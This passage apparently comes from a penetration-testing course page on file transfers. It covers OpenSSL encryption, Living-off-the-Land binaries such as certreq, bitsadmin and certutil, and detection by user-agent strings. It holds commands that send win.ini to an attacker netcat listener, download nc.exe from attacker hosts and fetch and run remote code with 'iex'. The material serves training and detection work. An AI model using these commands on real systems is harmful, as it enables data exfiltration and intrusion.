&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/18/2020&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;12:19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1724&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan-results.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/18/2020&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;12:20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;3448&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan-results.txt.aes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;file-encryption-on-linux&quot;&gt;File Encryption on Linux&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org/&quot;&gt;OpenSSL&lt;/a&gt; is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files “nc style” to encrypt files.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-aes256&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iter&lt;/span&gt; 100000 &lt;span class=&quot;nt&quot;&gt;-pbkdf2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; /etc/passwd &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;decrypt-passwdenc-with-openssl&quot;&gt;Decrypt passwd.enc with openssl&lt;/h4&gt;

&lt;p&gt;Protected File Transfers&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-aes256&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iter&lt;/span&gt; 100000 &lt;span class=&quot;nt&quot;&gt;-pbkdf2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; passwd.enc &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; passwd                    

enter aes-256-cbc decryption password:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;living-off-the-land&quot;&gt;Living off The Land&lt;/h1&gt;

&lt;p&gt;The phrase “Living off the land” was coined by Christopher Campbell &lt;a href=&quot;https://twitter.com/obscuresec&quot;&gt;@obscuresec&lt;/a&gt; &amp;amp; Matt Graeber &lt;a href=&quot;https://twitter.com/mattifestation&quot;&gt;@mattifestation&lt;/a&gt; at &lt;a href=&quot;https://www.youtube.com/watch?v=j-r6UonEkUw&quot;&gt;DerbyCon 3&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lolbas-project.github.io&quot;&gt;LOLBAS Project for Windows Binaries&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins for Linux Binaries&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Living off the Land binaries can be used to perform functions such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Download&lt;/li&gt;
  &lt;li&gt;Upload&lt;/li&gt;
  &lt;li&gt;Command Execution&lt;/li&gt;
  &lt;li&gt;File Read&lt;/li&gt;
  &lt;li&gt;File Write&lt;/li&gt;
  &lt;li&gt;Bypasses&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows &amp;amp; Linux systems.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;using-the-lolbas-and-gtfobins-project&quot;&gt;Using the LOLBAS and GTFOBins Project&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://lolbas-project.github.io/#&quot;&gt;LOLBAS for Windows&lt;/a&gt; and &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins for Linux&lt;/a&gt; are websites where we can search for binaries we can use for different functions.&lt;/p&gt;

&lt;h3 id=&quot;lolbas&quot;&gt;LOLBAS&lt;/h3&gt;
&lt;p&gt;#lolbas&lt;/p&gt;

&lt;p&gt;To search for download and upload functions in &lt;a href=&quot;https://lolbas-project.github.io/&quot;&gt;LOLBAS&lt;/a&gt; we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/download&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/upload&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg&quot; alt=&quot;LOLBAS project page listing binaries like CertReq.exe with functions and ATT&amp;amp;CK techniques.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use &lt;a href=&quot;https://lolbas-project.github.io/lolbas/Binaries/Certreq/&quot;&gt;CertReq.exe&lt;/a&gt; as an example.&lt;/p&gt;

&lt;p&gt;We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.&lt;/p&gt;

&lt;h4 id=&quot;upload-winini-to-our-pwnbox&quot;&gt;Upload win.ini to our Pwnbox&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will send the file to our Netcat session, and we can copy-paste its contents.&lt;/p&gt;

&lt;h4 id=&quot;file-received-in-our-netcat-session&quot;&gt;File Received in our Netcat Session&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 8000

listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8000 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.128] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;compatible&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Win32&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; NDES client 10.0.19041.1466/vb_release_svc_prod1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Content-Length: 92
Host: 192.168.49.128:8000

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;16-bit app support
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fonts]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;extensions]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mci extensions]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;files]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Mail]
&lt;span class=&quot;nv&quot;&gt;MAPI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you get an error when running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certreq.exe&lt;/code&gt;, the version you are using may not contain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Post&lt;/code&gt; parameter. You can download an updated version &lt;a href=&quot;https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe&quot;&gt;here&lt;/a&gt; and try again.&lt;/p&gt;

&lt;h3 id=&quot;gtfobins&quot;&gt;GTFOBins&lt;/h3&gt;

&lt;p&gt;To search for the download and upload function in &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins for Linux Binaries&lt;/a&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+file download&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+file upload&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg&quot; alt=&quot;GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&amp;amp;CK techniques.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use &lt;a href=&quot;https://www.openssl.org/&quot;&gt;OpenSSL&lt;/a&gt;. It’s frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files “nc style.”&lt;/p&gt;

&lt;p&gt;We need to create a certificate and start a server in our Pwnbox.&lt;/p&gt;

&lt;h4 id=&quot;create-certificate-in-our-pwnbox&quot;&gt;Create Certificate in our Pwnbox&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl req &lt;span class=&quot;nt&quot;&gt;-newkey&lt;/span&gt; rsa:2048 &lt;span class=&quot;nt&quot;&gt;-nodes&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-keyout&lt;/span&gt; key.pem &lt;span class=&quot;nt&quot;&gt;-x509&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-days&lt;/span&gt; 365 &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to &lt;span class=&quot;s1&quot;&gt;&apos;key.pem&apos;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt;, the field will be left blank.
&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
Country Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 letter code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AU]:
State or Province Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;full name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Some-State]:
Locality Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, city&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
Organization Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, company&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd]:
Organizational Unit Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, section&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
Common Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
Email Address &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;stand-up-the-server-in-our-pwnbox&quot;&gt;Stand up the Server in our Pwnbox&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_server &lt;span class=&quot;nt&quot;&gt;-quiet&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-accept&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-cert&lt;/span&gt; certificate.pem &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; key.pem &amp;lt; /tmp/LinEnum.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, with the server running, we need to download the file from the compromised machine.&lt;/p&gt;

&lt;h4 id=&quot;download-file-from-the-compromised-machine&quot;&gt;Download File from the Compromised Machine&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_client &lt;span class=&quot;nt&quot;&gt;-connect&lt;/span&gt; 10.10.10.32:80 &lt;span class=&quot;nt&quot;&gt;-quiet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; LinEnum.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;other-common-living-off-the-land-tools&quot;&gt;Other Common Living off the Land tools&lt;/h2&gt;

&lt;h3 id=&quot;bitsadmin-download-function&quot;&gt;Bitsadmin Download function&lt;/h3&gt;

&lt;p&gt;The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal&quot;&gt;Background Intelligent Transfer Service (BITS)&lt;/a&gt; can be used to download files from HTTP sites and SMB shares. It “intelligently” checks host and network utilization into account to minimize the impact on a user’s foreground work.&lt;/p&gt;

&lt;h4 id=&quot;file-download-with-bitsadmin&quot;&gt;File Download with Bitsadmin&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell-session&quot;&gt;PS C:\htb&amp;gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.&lt;/p&gt;

&lt;h4 id=&quot;download&quot;&gt;Download&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell-session&quot;&gt;PS C:\htb&amp;gt; Import-Module bitstransfer; Start-BitsTransfer -Source &quot;http://10.10.10.32:8000/nc.exe&quot; -Destination &quot;C:\Windows\Temp\nc.exe&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;certutil&quot;&gt;Certutil&lt;/h3&gt;

&lt;p&gt;Casey Smith (&lt;a href=&quot;https://twitter.com/subtee?lang=en&quot;&gt;@subTee&lt;/a&gt;) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.&lt;/p&gt;

&lt;h4 id=&quot;download-a-file-with-certutil&quot;&gt;Download a File with Certutil&lt;/h4&gt;

&lt;p&gt;Living off The Land&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;detection&quot;&gt;Detection&lt;/h1&gt;

&lt;p&gt;Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.&lt;/p&gt;

&lt;p&gt;Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; client is connecting to it, for example, Firefox, Chrome, etc.&lt;/p&gt;

&lt;p&gt;User agents are not only used to identify web browsers, but anything acting as an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; client and connecting to a web server via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; can have a user agent string (i.e., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cURL&lt;/code&gt;, a custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt; script, or common tools such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This &lt;a href=&quot;http://useragentstring.com/index.php&quot;&gt;website&lt;/a&gt; is handy for identifying common user agent strings. A list of user agent strings is available &lt;a href=&quot;http://useragentstring.com/pages/useragentstring.php&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).&lt;/p&gt;

&lt;h4 id=&quot;invoke-webrequest---client&quot;&gt;Invoke-WebRequest - Client&lt;/h4&gt;

&lt;p&gt;Detection&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.10.32/nc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Public\nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-RestMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.10.32/nc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Public\nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;invoke-webrequest---server&quot;&gt;Invoke-WebRequest - Server&lt;/h4&gt;

&lt;p&gt;Detection&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; WindowsPowerShell/5.1.14393.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;winhttprequest---client&quot;&gt;WinHttpRequest - Client&lt;/h4&gt;

&lt;p&gt;Detection&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new-object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-com&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinHttp.WinHttpRequest.5.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;GET&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.10.32/nc.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ResponseText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Detection&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /nc.exe HTTP/1.1
Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
User-Agent: Mozilla/4.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;compatible&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; MSIE 7.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Win64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; x64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Trident/7.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; .NET4.0C&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; .NET4.0E&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;certutil---client&quot;&gt;Certutil - Client&lt;/h4&gt;

&lt;p&gt;Detection&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb&amp;gt; certutil -verifyctl -split -f http://10.10.10.32/nc.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;changing-user-agent-in-powershell&quot;&gt;Changing user agent in Powershell&lt;/h3&gt;

